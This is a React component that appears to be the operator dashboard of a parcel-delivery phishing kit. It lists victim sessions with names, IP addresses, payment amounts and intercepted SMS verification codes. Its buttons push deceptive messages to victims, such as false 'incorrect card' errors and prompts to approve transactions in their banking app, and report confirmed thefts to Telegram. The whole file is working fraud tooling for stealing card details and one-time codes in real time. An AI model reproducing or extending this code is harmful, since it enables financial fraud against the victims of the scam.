import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import { 
  CreditCard, 
  Package,
  CheckCircle,
  Smartphone,
  MessageSquare,
  XCircle,
  Copy,
  Bell,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_ip: string | null;
  origin: string | null;
  destination: string | null;
  estimated_delivery: string | null;
  created_at: string;
  updated_at: string;
}

const stepNames: Record<number, string> = {
  1: "Parcel",
  2: "Card",
  3: "Verify",
  4: "Done"
};

const stepColors: Record<number, string> = {
  1: "bg-blue-500",
  2: "bg-yellow-500",
  3: "bg-purple-500",
  4: "bg-green-500"
};

interface ClientRowProps {
  session: ClientSession;
  isSelected?: boolean;
  onToggleSelect?: () => void;
}

export function ClientRow({ session, isSelected = false, onToggleSelect }: ClientRowProps) {
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Copied!" });
  };

  // Actions
  const sendToSmsVerification = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: null, verification_code: null })
      .eq("id", session.id);
    toast({ title: "→ SMS" });
  };

  const sendToAppApproval = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
      .eq("id", session.id);
    toast({ title: "→ App" });
  };

  const sendWrongCardMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 2,
        approval_type: null,
        admin_message: "The card details you entered are incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Wrong card" });
  };

  const sendWrongSmsMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        admin_message: "The verification code you entered is incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Wrong SMS" });
  };

  const sendWrongApprovalMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        admin_message: "Approval not received. Please try again in your banking app.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Wrong Approval" });
  };

  const sendPushRequest = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        admin_message: "Please check your banking app now and approve the transaction.",
        message_type: "info"
      })
      .eq("id", session.id);
    toast({ title: "Push sent" });
  };

  const sendBackToParcel = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 1,
        approval_type: null,
        admin_message: null,
        message_type: null
      })
      .eq("id", session.id);
    toast({ title: "→ Parcel" });
  };

  const sendBackToCard = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 2, approval_type: null })
      .eq("id", session.id);
    toast({ title: "→ Card" });
  };

  const confirmPayment = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "sms" })
      .eq("id", session.id);
    await supabase.functions.invoke("send-telegram", {
      body: { message: `✅ SMS - #${session.session_code}` },
    });
    toast({ title: "✓ Confirmed" });
  };

  const approvePayment = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "app" })
      .eq("id", session.id);
    await supabase.functions.invoke("send-telegram", {
      body: { message: `✅ App - #${session.session_code}` },
    });
    toast({ title: "✓ Approved" });
  };

  const clearMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", session.id);
    toast({ title: "Cleared" });
  };

  const isWaiting = session.current_step === 2 && session.approval_type === "payment_waiting";
  const isVerifying = session.current_step === 3;
  const isAppMode = session.approval_type === "app_pending";

  const maskedIP = session.client_ip 
    ? session.client_ip.split('.').slice(0, 2).join('.') + '.**.**'
    : null;

  return (
    <div className={`border rounded-lg mb-2 overflow-hidden ${isSelected ? 'ring-2 ring-primary' : ''} ${isWaiting ? 'bg-orange-50 dark:bg-orange-950/30 border-orange-300' : 'bg-card'}`}>
      {/* Main Info Row */}
      <div className="p-3 flex items-center gap-3">
        <Checkbox
          checked={isSelected}
          onCheckedChange={onToggleSelect}
        />
        
        {/* Session Code & Step */}
        <div className="flex items-center gap-2 min-w-[100px]">
          <span className="font-mono text-sm font-bold">#{session.session_code}</span>
          <Badge className={`${stepColors[session.current_step]} text-white text-xs`}>
            {isWaiting ? "⏳ Wait" : stepNames[session.current_step]}
          </Badge>
        </div>

        {/* Client Info */}
        <div className="flex-1 flex items-center gap-4 text-sm">
          {session.client_name && (
            <span className="font-medium">{session.client_name}</span>
          )}
          
          {maskedIP && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <button 
                    onClick={() => copyToClipboard(session.client_ip!)}
                    className="text-muted-foreground hover:text-foreground flex items-center gap-1"
                  >
                    <span className="font-mono text-xs">{maskedIP}</span>
                    <Copy className="w-3 h-3" />
                  </button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>Click to copy: {session.client_ip}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>

        {/* Amount */}
        <div className="text-right min-w-[70px]">
          <span className="font-bold text-lg">
            {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
          </span>
        </div>

        {/* Verification Code */}
        {isVerifying && !isAppMode && session.verification_code && (
          <div className="bg-purple-100 dark:bg-purple-900/50 text-purple-700 dark:text-purple-300 px-2 py-1 rounded font-mono text-sm font-bold">
            {session.verification_code}
          </div>
        )}
        {isVerifying && isAppMode && (
          <div className="bg-blue-100 dark:bg-blue-900/50 text-blue-700 dark:text-blue-300 px-2 py-1 rounded text-sm font-medium">
            📱 App
          </div>
        )}
      </div>

      {/* Actions Row - Always Visible */}
      <div className="px-3 pb-3 flex flex-wrap gap-1.5">
        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs" 
          onClick={sendBackToParcel}
        >
          <Package className="w-3 h-3 mr-1" /> Parcel
        </Button>
        
        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs" 
          onClick={sendBackToCard}
        >
          <CreditCard className="w-3 h-3 mr-1" /> Card
        </Button>
        
        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs" 
          onClick={sendToSmsVerification}
        >
          <MessageSquare className="w-3 h-3 mr-1" /> SMS
        </Button>
        
        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs" 
          onClick={sendToAppApproval}
        >
          <Smartphone className="w-3 h-3 mr-1" /> App
        </Button>

        <div className="w-px h-7 bg-border mx-1" />
        
        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs text-orange-600 border-orange-300 hover:bg-orange-50" 
          onClick={sendWrongCardMessage}
        >
          Wrong Card
        </Button>

        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs text-orange-600 border-orange-300 hover:bg-orange-50" 
          onClick={sendWrongSmsMessage}
        >
          Wrong SMS
        </Button>

        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs text-orange-600 border-orange-300 hover:bg-orange-50" 
          onClick={sendWrongApprovalMessage}
        >
          Wrong Approval
        </Button>

        <Button 
          size="sm" 
          variant="outline" 
          className="h-7 text-xs text-blue-600 border-blue-300 hover:bg-blue-50" 
          onClick={sendPushRequest}
        >
          <Bell className="w-3 h-3 mr-1" /> Request Push
        </Button>

        {session.admin_message && (
          <Button 
            size="sm" 
            variant="outline" 
            className="h-7 text-xs" 
            onClick={clearMessage}
          >
            <XCircle className="w-3 h-3 mr-1" /> Clear Msg
          </Button>
        )}

        <div className="flex-1" />

        <Button 
          size="sm" 
          className="h-7 text-xs bg-green-600 hover:bg-green-700" 
          onClick={confirmPayment}
        >
          <CheckCircle className="w-3 h-3 mr-1" /> Confirm SMS
        </Button>
        
        <Button 
          size="sm" 
          className="h-7 text-xs bg-blue-600 hover:bg-blue-700" 
          onClick={approvePayment}
        >
          <CheckCircle className="w-3 h-3 mr-1" /> Approve App
        </Button>
      </div>
    </div>
  );
}
